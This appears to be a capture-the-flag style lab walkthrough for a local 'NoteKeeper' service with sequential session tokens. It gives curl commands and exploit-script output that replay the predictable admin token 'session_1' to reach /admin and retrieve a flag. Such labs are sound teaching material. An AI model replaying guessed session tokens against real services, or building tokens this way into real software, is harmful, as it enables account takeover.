# Walkthrough

## Setup

```
cd session-management
docker compose up --build -d
```

Confirm the service is running:

```
curl http://localhost:8080/
```

```json
{
  "service": "NoteKeeper v1.0",
  "endpoints": [...]
}
```

## Step 1: Register and Observe Your Token

```
curl -s -X POST http://localhost:8080/register \
  -H 'Content-Type: application/json' \
  -d '{"username":"attacker","password":"test"}' \
  -D -
```

```
HTTP/1.0 201 Created
Set-Cookie: session=session_2; Path=/
```

Your token is `session_2`. Admin was created at startup and received `session_1`.

## Step 2: Use session_1 on /admin

```
curl -s http://localhost:8080/admin -H 'Cookie: session=session_1'
```

```json
{
  "message": "Welcome, admin.",
  "flag": "POC{a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4}"
}
```

## Automated

```
python3 exploit/exploit.py http://localhost:8080
```

Output:

```
[*] Target: http://localhost:8080
[*] Step 1: registering 'attacker_a3f1' to probe the token counter...
    My session token: session_3
[*] Step 2: admin token is predictably 'session_1'
[*] Step 3: sending GET /admin with Cookie: session=session_1
[*] Flag: POC{a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4}
```
